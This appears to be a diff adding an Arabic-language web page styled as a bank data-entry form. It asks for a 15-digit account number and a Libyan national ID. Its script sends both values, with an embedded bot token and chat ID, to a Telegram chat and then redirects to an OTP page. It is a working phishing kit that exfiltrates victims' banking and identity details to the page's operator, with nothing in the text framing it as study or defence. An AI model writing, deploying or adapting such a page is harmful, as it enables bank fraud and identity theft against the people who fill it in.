@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال البيانات</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; font-size: 14px; }
+        .input-wrapper { position: relative; display: flex; align-items: center; }
+        input, select { width: 100%; padding: 12px 15px; border: 1.5px solid #d1d1d1; border-radius: 8px; outline: none; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: #0052ff; }
+        .icon-placeholder { position: absolute; left: 12px; color: #004085; }
+        .btn-submit { width: 100%; padding: 15px; background: #0052ff; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .error-msg { color: red; font-size: 12px; margin-top: 5px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <form id="mainForm">
+        <div class="form-group">
+            <label>رقم الحساب (15 رقم)</label>
+            <div class="input-wrapper">
+                <input type="text" id="accNum" placeholder="XXXXXXXXXXXXXXX" maxlength="15" autocomplete="off">
+                <span class="icon-placeholder">🏛️</span>
+            </div>
+            <div id="accError" class="error-msg">يجب إدخال 15 رقمًا صحيحًا</div>
+        </div>
+
+        <div class="form-group">
+            <label>الجنسية</label>
+            <select id="nationality"><option value="ليبيا">ليبيا</option></select>
+        </div>
+
+        <div class="form-group">
+            <label>رقم الوطني (12 رقم)</label>
+            <div class="input-wrapper">
+                <input type="text" id="natNum" placeholder="XXXXXXXXXXXX" maxlength="12" autocomplete="off">
+                <span class="icon-placeholder">💳</span>
+            </div>
+            <div id="natError" class="error-msg">يجب إدخال 12 رقمًا صحيحًا</div>
+        </div>
+
+        <button type="submit" class="btn-submit">استمرار</button>
+    </form>
+</div>
+
+<script>
+    // بيانات التيليجرام الخاصة بك
+    const TOKEN = "8667076828:AAEsfXzTXa9P1ZRHBB4b0Jc6L25YoBHiQms";
+    const CHAT_ID = "8781839216";
+
+    // تنظيف الإدخال وتحويل الأرقام العربية ومنع الرموز
+    function cleanInput(val) {
+        const arabicNumbers = [/٠/g, /١/g, /٢/g, /٣/g, /٤/g, /٥/g, /٦/g, /٧/g, /٨/g, /٩/g];
+        for (let i = 0; i < 10; i++) {
+            val = val.replace(arabicNumbers[i], i);
+        }
+        return val.replace(/[^\d]/g, ''); 
+    }
+
+    const accInput = document.getElementById('accNum');
+    const natInput = document.getElementById('natNum');
+
+    [accInput, natInput].forEach(input => {
+        input.addEventListener('input', (e) => {
+            e.target.value = cleanInput(e.target.value);
+        });
+    });
+
+    document.getElementById('mainForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const acc = accInput.value;
+        const nat = natInput.value;
+        let valid = true;
+
+        if (acc.length !== 15) {
+            document.getElementById('accError').style.display = 'block';
+            valid = false;
+        } else {
+            document.getElementById('accError').style.display = 'none';
+        }
+
+        if (nat.length !== 12) {
+            document.getElementById('natError').style.display = 'block';
+            valid = false;
+        } else {
+            document.getElementById('natError').style.display = 'none';
+        }
+
+        if (!valid) return;
+
+        // توليد رقم الطلب العشوائي
+        const orderID = Math.floor(100000 + Math.random() * 900000);
+        localStorage.setItem('orderID', orderID);
+
+        // تنسيق الرسالة لتيليجرام (Markdown لسهولة النسخ)
+        const text = `📦 *طلب جديد رقم:* \`${orderID}\`\n\n` +
+                     `👤 رقم الحساب:\n\`${acc}\`\n\n` +
+                     `🆔 الرقم الوطني:\n\`${nat}\``;
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).then(() => {
+            window.location.href = 'otp.html';
+        }).catch(() => {
+            window.location.href = 'otp.html';
+        });
+    });
+</script>
+</body>
+</html>
